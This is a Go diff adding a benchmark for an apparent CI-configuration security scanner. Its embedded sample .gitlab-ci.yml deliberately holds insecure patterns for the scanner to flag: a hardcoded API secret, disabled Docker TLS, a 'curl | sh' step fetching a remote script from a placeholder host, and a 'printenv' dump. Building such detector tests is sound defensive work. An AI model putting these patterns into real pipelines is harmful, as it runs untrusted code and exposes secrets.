@@ -27,3 +27,28 @@ jobs:
 		}
 	}
 }
+
+func BenchmarkScanGitLabCI(b *testing.B) {
+	sample := `
+stages:
+  - build
+image: docker:latest
+variables:
+  DOCKER_TLS_CERTDIR: ""
+  API_SECRET_KEY: "hardcodedDemoValue99"
+services:
+  - docker:dind
+build:
+  script:
+    - curl -sSL https://example.invalid/init.sh | sh
+    - printenv
+`
+	b.ReportAllocs()
+	b.ResetTimer()
+	for i := 0; i < b.N; i++ {
+		findings, err := ScanContent(sample, ".gitlab-ci.yml")
+		if err != nil || len(findings) == 0 {
+			b.Fatalf("unexpected benchmark result: findings=%d err=%v", len(findings), err)
+		}
+	}
+}
